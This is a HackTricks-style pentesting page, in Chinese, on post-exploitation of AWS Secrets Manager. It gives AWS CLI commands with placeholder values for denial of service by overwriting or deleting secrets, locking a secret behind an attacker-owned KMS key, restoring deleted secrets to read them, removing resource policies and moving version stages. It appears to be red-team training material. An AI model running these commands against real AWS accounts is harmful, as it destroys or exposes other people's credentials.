# AWS - Secrets Manager Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Secrets Manager

更多信息请参见：

{{#ref}}
../aws-services/aws-secrets-manager-enum.md
{{#endref}}

### 读取 Secrets

这些 **secrets 本身是敏感信息**，[请查看 privesc 页面](../aws-privilege-escalation/aws-secrets-manager-privesc.md) 了解如何读取它们。

### DoS 更改 Secret 值

更改 secret 的值可能会对所有依赖该值的系统造成 **DoS**。

> [!WARNING]
> 请注意，先前的值也会被存储，因此可以很容易地恢复到之前的值。
```bash
# Requires permission secretsmanager:PutSecretValue
aws secretsmanager put-secret-value \
--secret-id MyTestSecret \
--secret-string "{\"user\":\"diegor\",\"password\":\"EXAMPLE-PASSWORD\"}"
```
### DoS Change KMS key

如果 attacker 拥有 secretsmanager:UpdateSecret 权限，就可以将 secret 配置为使用由 attacker 拥有的 KMS key。该 key 最初被设置为任何人都可以访问和使用，因此可以使用该新 key 更新 secret。如果该 key 无法访问，则无法更新 secret。

在更改 secret 的 key 之后，attacker 会修改其 key 的配置，使只有他们自己可以访问。这样，之后的 secret 版本将使用新 key 加密，由于无法访问该 key，就无法检索 secret。

需要注意的是，这种不可访问性只会发生在后续版本（在 secret 内容更改之后），因为当前版本仍然使用原来的 KMS key 加密。
```bash
aws secretsmanager update-secret \
--secret-id MyTestSecret \
--kms-key-id arn:aws:kms:us-west-2:123456789012:key/EXAMPLE1-90ab-cdef-fedc-ba987EXAMPLE
```
### DoS Deleting Secret

删除 secret 的最短天数为 7 天
```bash
aws secretsmanager delete-secret \
--secret-id MyTestSecret \
--recovery-window-in-days 7
```
## secretsmanager:RestoreSecret

可以恢复一个 secret，这允许恢复已计划删除的 secret，因为 secrets 的最短删除期限为 7 天，最长为 30 天。再加上 secretsmanager:GetSecretValue 权限，就可以检索它们的内容。

要恢复正在被删除的 secret，您可以使用以下命令：
```bash
aws secretsmanager restore-secret \
--secret-id <Secret_Name>
```
## secretsmanager:DeleteResourcePolicy

此操作允许删除控制谁可以访问 secret 的 resource policy。如果该 resource policy 被配置为允许特定用户集访问，则可能导致 DoS。

要删除 resource policy：
```bash
aws secretsmanager delete-resource-policy \
--secret-id <Secret_Name>
```
## secretsmanager:UpdateSecretVersionStage

一个 secret 的状态用于管理 secret 的不同版本。AWSCURRENT 标记应用程序使用的活动版本，AWSPREVIOUS 保留前一个版本以便在必要时回滚，而 AWSPENDING 在轮换过程中用于准备并验证新版本，在将其设为当前版本之前使用。

应用程序总是读取标有 AWSCURRENT 的版本。如果有人把该标签移动到错误的版本，应用将使用无效的凭据并可能失败。

AWSPREVIOUS 不会被自动使用。然而，如果 AWSCURRENT 被移除或错误地重新分配，可能会看起来一切仍在使用前一个版本运行。
```bash
aws secretsmanager update-secret-version-stage \
--secret-id <your-secret-name-or-arn> \
--version-stage AWSCURRENT \
--move-to-version-id <target-version-id> \
--remove-from-version-id <previous-version-id>
```
{{#include ../../../banners/hacktricks-training.md}}
